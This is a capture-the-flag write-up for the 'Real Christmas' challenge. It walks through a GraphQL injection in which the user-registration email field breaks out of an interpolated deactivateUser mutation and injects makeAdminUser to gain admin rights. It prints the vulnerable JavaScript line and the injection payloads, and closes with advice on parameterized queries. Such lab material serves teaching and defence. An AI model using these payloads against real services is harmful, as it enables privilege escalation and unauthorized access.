---
title: "Real Christmas"
date: 2025-06-22
description: GraphQL injection via unescaped string interpolation in user registration allows chaining unauthorized administrative mutations.
challenge_author: "Not specified"
writeup_author: "sleepyswords & wallsdeep13"
---

**Challenge:** Real Christmas

**Goal:** Exploit a GraphQL injection flaw to elevate user privileges and obtain the flag.

**Flag:**
- `GPNCTF{...}` - accessed via administrative privileges on the flag endpoint

---

## Vulnerability

The application interacts with an internal GraphQL service by constructing query strings through direct string concatenation rather than parameterized GraphQL variables:

```javascript
const query = `mutation { deactivateUser(email: "${email}") { success } }`;
```

The application runs a scheduled or automated `deactivateUser` mutation to clean up registered users. 

By registering a user whose email contains embedded quotes and GraphQL syntax, an attacker can break out of the string literal, neutralize the remaining query syntax using a comment (`#`), and inject arbitrary GraphQL mutations, such as `makeAdminUser(user: {id: 1})`.

## Attack Path

### 1. Register User to Break Automatic Deactivation

Register an account with the username:

```
"test"@test.com
```

The unescaped quotes break the syntax of the automated `deactivateUser` mutation, preventing the test account from being deleted.

### 2. Query User ID via GraphQL

Navigate to the `/graphql` endpoint and query the user ID associated with the email:

```graphql
query {
  userEmail(email: ""test"@test.com") {
    id
  }
}
```

Note the returned user `id` (e.g., `1`).

### 3. Inject the makeAdminUser Mutation

Register another user with an email payload designed to inject the admin mutation:

```
"}){success}makeAdminUser(user:{id:1}){#"@test.com
```

When evaluated by the backend, the constructed mutation expands to:

```graphql
mutation {
  deactivateUser(email: ""}){success}
  makeAdminUser(user:{id:1}){#"@test.com") { success }
}
```

The backend executes `makeAdminUser(user:{id:1})`, promoting our account to administrator.

### 4. Claim the Flag

Log in with user ID 1 and navigate to the admin dashboard to retrieve the flag.

---

## Notes

- Never interpolate user-supplied strings directly into GraphQL queries or mutations.
- Always use parameterized GraphQL variables (`$email: String!`) to guarantee separation of code and user data.
